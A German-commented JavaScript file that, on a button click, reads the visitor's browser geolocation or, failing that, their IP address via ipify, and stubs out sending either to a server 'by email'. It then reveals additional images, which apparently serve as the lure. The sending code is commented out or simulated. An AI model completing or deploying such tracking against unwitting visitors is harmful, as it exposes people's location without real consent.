// Funktion, um den Standort des Benutzers zu ermitteln und die Bilder hinzuzufügen
document.getElementById('trackBtn').addEventListener('click', function() {
    getLocation();
    showNewImages(); // Neue Bilder immer anzeigen, auch bei Fehlern
});

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationByEmail, handleLocationError);
    } else {
        document.getElementById("status").innerHTML = "Geolocation wird von diesem Browser nicht unterstützt.";
        handleLocationError(); // IP-Adresse ermitteln, wenn keine Geolocation verfügbar ist
    }
}

// Funktion zum Senden des Standorts per E-Mail
function sendLocationByEmail(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    // Hier könntest du eine Funktion zum Senden der Daten per E-Mail einfügen.
    // Zum Beispiel eine Fetch-Anfrage oder eine andere Methode zum Senden der Daten an deinen Server.
    const locationData = {
        latitude: lat,
        longitude: lon
    };

    // Beispiel: Senden der Daten an einen Server (hier simuliert durch console.log)
    console.log("Standortdaten senden:", locationData);

    // Hier könntest du eine Funktion verwenden, die die Daten per E-Mail versendet (z.B. über ein Backend oder ein Formular)
    // fetch('/send-location', {
    //   method: 'POST',
    //   body: JSON.stringify(locationData),
    //   headers: {
    //     'Content-Type': 'application/json',
    //   },
    // });
}

function handleLocationError() {
    // IP-Adresse ermitteln, wenn Standort nicht verfügbar ist
    document.getElementById("status").innerHTML = "Standort konnte nicht ermittelt werden. Wir versuchen, Ihre IP-Adresse zu verwenden.";

    // Führe die Funktion aus, um die IP-Adresse des Benutzers zu ermitteln
    getIP();
    
    // Neue Bilder immer anzeigen
    showNewImages();
}

// Funktion, um die IP-Adresse des Benutzers zu ermitteln
function getIP() {
    // Hier verwenden wir ipify (https://www.ipify.org/) für die IP-Ermittlung
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            console.log("Benutzer IP-Adresse:", ipAddress);

            // IP-Adresse per E-Mail senden oder anderweitig verwenden
            sendIPByEmail(ipAddress); // IP-Adresse senden (funktion muss noch definiert werden)
        })
        .catch(error => {
            console.error("Fehler beim Abrufen der IP-Adresse:", error);
        });
}

// Funktion zum Senden der IP-Adresse per E-Mail (simuliert)
function sendIPByEmail(ipAddress) {
    // Hier könntest du die IP-Adresse an deinen Server senden, der dann die E-Mail versendet
    const ipData = {
        ip: ipAddress
    };

    console.log("IP-Adresse senden:", ipData);
    
    // Beispiel: Senden der IP-Adresse an den Server (kannst du anpassen)
    // fetch('/send-ip', {
    //   method: 'POST',
    //   body: JSON.stringify(ipData),
    //   headers: {
    //     'Content-Type': 'application/json',
    //   },
    // });
}

// Funktion, um neue Bilder hinzuzufügen
function showNewImages() {
    // Anzeigen des Containers für neue Bilder
    document.getElementById("new-images").style.display = "block";

    // Hier fügen wir dynamisch 3 neue Bilder hinzu
    const newImages = [
        'bild4.jpg', // Bild 4
        'bild5.jpg', // Bild 5
        'bild6.jpg'  // Bild 6
    ];

    // Hole den Container für zusätzliche Bilder
    const additionalImagesContainer = document.getElementById("additional-images");

    // Füge jedes Bild dynamisch zum Container hinzu
    newImages.forEach(function(imageSrc) {
        const imgElement = document.createElement("img");
        imgElement.src = imageSrc;
        imgElement.alt = "Weitere Bilder";
        additionalImagesContainer.appendChild(imgElement);
    });

    // Zeige den Text "Weitere Bilder & Videos in Kürze"
    document.getElementById("message").style.display = "block";
}
